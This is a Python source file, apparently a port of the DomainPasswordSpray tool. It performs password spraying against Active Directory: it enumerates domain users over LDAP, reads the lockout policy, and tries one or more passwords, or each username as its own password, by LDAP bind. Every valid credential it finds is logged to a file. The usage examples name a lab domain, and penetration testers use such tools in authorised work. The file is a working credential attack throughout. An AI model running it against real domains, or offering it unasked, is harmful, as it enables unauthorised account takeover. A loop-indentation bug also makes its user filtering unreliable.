#!/usr/bin/env python3
"""
DomainPasswordSpray.py - Python port of dafthack/DomainPasswordSpray (versión simplificada)
python3 DomainPasswordSpray.py -Domain empresa.com -Password Winter2026
"""

import argparse
import socket
import sys
import time
import random
from ldap3 import Server, Connection, ALL
import getpass

class DomainPasswordSpray:
    def discover_dc_ip(self, domain):
        """Auto-detecta DC IP con socket nativo"""
        try:
            dc_ip = socket.gethostbyname(domain)
            print(f"[*] Auto-detected DC: {dc_ip}")
            return dc_ip
        except:
            print("[!] DC discovery failed, using manual input")
            return None
        
    def __init__(self, args):
        self.args = args
        self.dc_ip = args.dc_ip
        self.domain = args.Domain
        
        if hasattr(self.args, 'dc_ip') and self.args.dc_ip:
            self.dc_ip = self.args.dc_ip
            print(f"[*] Using provided DC: {self.dc_ip}")
        else:
            print(f"[*] Auto-discovering DC for {self.domain}...")
            self.dc_ip = self.discover_dc_ip(self.domain)
        
        self.ldap_user = None
        self.ldap_pass = None
        self.lockout_threshold = None
        self.observation_windows = None

    def countdown_timer(self, seconds, message="[*] Pausing to avoid account lockout."):
        """Cuenta regresiva entre rondas de passwords"""
        for i in range(seconds, 0, -1):
            mins = i // 60
            secs = i % 60
            print(f"\r{message} Waiting {mins:02d}:{secs:02d}", end='', flush=True)
            time.sleep(1)
        print("\r" + " " * 80 + "\r", end='', flush=True)

    def get_observation_window(self, dc_ip):
       server = Server(f"{dc_ip}:389", get_info=ALL)
       conn = Connection(server, user=f"{self.ldap_user}@{self.domain}", password=self.ldap_pass, auto_bind=True)
    
       base_dn = f"DC={self.domain.replace('.', ',DC=')}"
       conn.search(base_dn, '(objectClass=*)', attributes=['lockOutObservationWindow'])
       print(f"[DEBUG] Entries found: {len(conn.entries)}")
    
       if conn.entries and conn.entries[0].lockOutObservationWindow:
           window_value = conn.entries[0].lockOutObservationWindow.value
           if hasattr(window_value, 'total_seconds'):
               window_raw = abs(int(window_value.total_seconds() * 10000000))
           else:
               window_raw = abs(int(window_value))
           window_minutes = int(window_raw / 600000000)
           conn.unbind()
           return window_minutes
       else:
           conn.unbind()
           return 0  

    def get_lockout_threshold(self, dc_ip):
       """Obtiene lockout threshold de password policy"""
       server = Server(f"{dc_ip}:389", get_info=ALL)
       conn = Connection(server, user=f"{self.ldap_user}@{self.domain}", password=self.ldap_pass, auto_bind=True)
    
       base_dn = f"DC={self.domain.replace('.', ',DC=')}"
       conn.search(base_dn, '(objectClass=*)', attributes=['lockOutThreshold'])
    
       if conn.entries and conn.entries[0].lockOutThreshold:
           threshold = int(conn.entries[0].lockOutThreshold.value or 0)
           conn.unbind()
           if threshold == 0:
               return "None"
           return threshold
       else:
           conn.unbind()
           return "None"

    def get_domain_users(self, dc_ip):
        """Genera lista segura de usuarios del dominio"""
        server = Server(dc_ip, port=389, get_info=ALL)
        conn = Connection(server, user=f"{self.ldap_user}@{self.domain}", 
                         password=self.ldap_pass, auto_bind=True)
        
        base_dn = f"DC={self.domain.replace('.', ',DC=')}"
        
        # Filtro: usuarios activos, no cerca de lockout
        base_filter = '(&(objectClass=user)(!(userAccountControl=2)))'
        
        users = []
        conn.search(base_dn, base_filter, attributes=['sAMAccountName', 'badPwdCount'], 
                   paged_size=1000, size_limit=0)
        
        print(f"[*] {len(conn.entries)} total users found")
        print("[*] Removing users within 1 attempt of locking out...")
        
        if self.lockout_threshold > 0:
            for entry in conn.entries:
               bad_count = int(entry.badPwdCount.value or 0)
            if (self.lockout_threshold - bad_count) > 1:  # More than 1 attempt remaining
                users.append(str(entry.sAMAccountName.value))
        else:
            for entry in conn.entries:  # Loop through ALL entries when no threshold
               users.append(str(entry.sAMAccountName.value))

        print(f"[*] Created userlist with {len(users)} safe users")
        return users

    def spray_single_password(self, dc_ip, users, password, outfile=None, username_as_password=False):
        """Prueba una contraseña contra todos los usuarios"""
        count = len(users)
        successes = []
        
        print(f"[*] {'Username-as-password attack' if username_as_password else f"Trying password '{password}' against {count} users"}")
        
        for i, username in enumerate(users):
            if username_as_password:
                test_pass = username
                
                # **SOLUCIÓN DEFINITIVA**: Solo progress bar, sin texto intermedio
                print(f"\033[2K\r{i+1}/{count} Testing '{test_pass}' -> '{username}'", end='', flush=True)
                
                # LDAP bind test
                server = Server(dc_ip, connect_timeout=5)
                conn = Connection(server, user=f"{username}@{self.domain}", 
                                password=test_pass, raise_exceptions=False)
                
                if conn.bind():
                    print()  # Línea nueva para éxito
                    success = f"{username}:{test_pass}"
                    successes.append(success)
                    print(f"\033[92m[*] SUCCESS! {success}\033[0m")
                    if outfile:
                        with open(outfile, 'a') as f:
                            f.write(f"{success}\n")
                
                conn.unbind()
            else:
                test_pass = password
                # Password fijo: solo progress normal
                # print(f"\r{i+1}/{count} users tested", end='', flush=True)
                
                server = Server(dc_ip, connect_timeout=5)
                conn = Connection(server, user=f"{username}@{self.domain}", 
                                password=test_pass, raise_exceptions=False)
                
                if conn.bind():
                    print()  # Línea nueva
                    success = f"{username}:{test_pass}"
                    successes.append(success)
                    print(f"\033[1A\033[2K", end='', flush=True)
                    print(f"\033[92m[*] SUCCESS! {username}:{test_pass}\033[0m")
                    
                    if outfile:
                        with open(outfile, 'a') as f:
                            f.write(f"{success}\n")
                
                conn.unbind()
                
            print(f"\033[2K\r{i+1}/{count} {'Testing' if username_as_password else 'users'} tested", end='', flush=True)
            time.sleep(random.uniform(0.8, 1.5))
        
        print("\n")  # Línea final limpia
        return successes

    def confirm_spray(self, user_count):
        """Confirmación antes de spray"""
        print(f"\n[*] Confirm Password Spray")
        print(f"Are you sure you want to spray {user_count} accounts? [y/N]")
        response = input().lower()
        return response in ['y', 'yes']

    def run(self):
        # Pedir credenciales LDAP interactivamente
        print("[*] LDAP credentials required for enumeration")
        self.ldap_user = input("LDAP Username (user@domain.com): ")
        self.ldap_pass = getpass.getpass("LDAP Password: ")
        
        if self.dc_ip is None:
           # Auto-detectar DC
           print("[*] Detecting Domain Controller...")
           try:
               server = Server(self.domain, get_info=ALL, locate_flavor='SRV')
               self.dc_ip = server.host[0].addr if server.host else None
           except:
               self.dc_ip = input("DC IP (ej: 192.168.1.10): ")
        
           print(f"[*] Using DC: {self.dc_ip}")

        
        self.observation_window = self.get_observation_window(self.dc_ip)
        print(f"[*] Domain observation window: {self.observation_window} minutes")
        self.lockout_threshold = self.get_lockout_threshold(self.dc_ip)
        if self.lockout_threshold == 'None':
           self.lockout_threshold = 0
        print(f"[*] Lockout threshold: {self.lockout_threshold} attempts")
        
        # Obtener passwords
        if self.args.password:
            passwords = [self.args.password]
        elif self.args.password_list:
            with open(self.args.password_list) as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif self.args.username_as_password:
            passwords = None
        else:
            print("[-] ERROR: Specify -Password, -PasswordList, or -UsernameAsPassword")
            return
        
        # Obtener usuarios
        if self.args.user_list:
            print(f"[*] Using {self.args.user_list} as userlist")
            print("[!] Warning: Userlist bypasses lockout checks!")
            with open(self.args.user_list) as f:
                users = [line.strip() for line in f if line.strip()]
        else:
            print("[*] Auto-generating safe userlist...")
            users = self.get_domain_users(self.dc_ip)
        
        if not self.confirm_spray(len(users)):
            print("[-] Cancelled")
            return
            
        all_successes = []
        
        print(f"[*] Password spraying with {len(passwords) if passwords else 'username-as-password'} passwords")

        # Spray cada password
        if self.args.username_as_password:
            successes = self.spray_single_password(self.dc_ip, users, None, self.args.outfile, True)
            all_successes.extend(successes)
        else:
            for i, password in enumerate(passwords):
                print(f"\n[*] Password {i+1}/{len(passwords)}")
                successes = self.spray_single_password(self.dc_ip, users, password, self.args.outfile)
                all_successes.extend(successes)
                
                if i+1 < len(passwords):
                    wait_seconds = self.observation_window * 60 + 600  # +10min fudge
                    self.countdown_timer(wait_seconds)
        
        print("\n[*] Password spraying complete!")
        if self.args.outfile:
            print(f"[*] Successes saved to {self.args.outfile}")
        
        if all_successes:
            print(f"[+] Found {len(all_successes)} valid credentials")

def print_banner():
    banner = r"""
    ____                        _       ____                                          _______                       
   / __ \____  ____ ___  ____ _(_)___  / __ \____ ____________      ______  _________/ / ___/____  _________ ___  __
  / / / / __ \/ __ `__ \/ __ `/ / __ \/ /_/ / __ `/ ___/ ___/ | /| / / __ \/ ___/ __  /\__ \/ __ \/ ___/ __ `/ / / /
 / /_/ / /_/ / / / / / / /_/ / / / / / ____/ /_/ (__  |__  )| |/ |/ / /_/ / /  / /_/ /___/ / /_/ / /  / /_/ / /_/ / 
/_____/\____/_/ /_/ /_/\__,_/_/_/ /_/_/    \__,_/____/____/ |__/|__/\____/_/   \__,_//____/ .___/_/   \__,_/\__, /  
                                                                                         /_/               /____/   

    """
    print(banner)


def main():
    print_banner()
    
    print() 

    parser = argparse.ArgumentParser(
        description="""DomainPasswordSpray.py - Simplified

    Active Directory password spraying tool with lockout protection.
    
    USAGE EXAMPLES:
        python3 password_spray.py -Domain fries.htb -Password Winter2026
        python3 password_spray.py -Domain fries.htb -PasswordList passwords.txt
        python3 password_spray.py -Domain fries.htb -UsernameAsPassword""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""NOTES:
    * Auto-detects Domain Controller
    * Respects lockout threshold & observation window
    * LDAP read credentials required for safe enumeration"""
    )
    
    parser.add_argument('-UserList', metavar='', help='Userlist file', dest='user_list')
    parser.add_argument('-Password', metavar='', help='Single password to spray', dest='password')
    parser.add_argument('-PasswordList', metavar='', help='    Password list file (one password per line)', 
                       dest='password_list')
    parser.add_argument('-OutFile', metavar='', help='Output file for valid credentials', dest='outfile')
    parser.add_argument('-Domain', metavar='', required=True, help='Target domain name (e.g. contoso.com)')
    parser.add_argument('-UsernameAsPassword', action='store_true', 
                       help='    Use username as password for each account', dest='username_as_password')
    parser.add_argument('-dc', metavar='',  dest='dc_ip', 
                       help='Domain Controller IP (auto-detected if not provided)')
    
    args = parser.parse_args()
    
    sprayer = DomainPasswordSpray(args)
    sprayer.run()

if __name__ == "__main__":
    main()
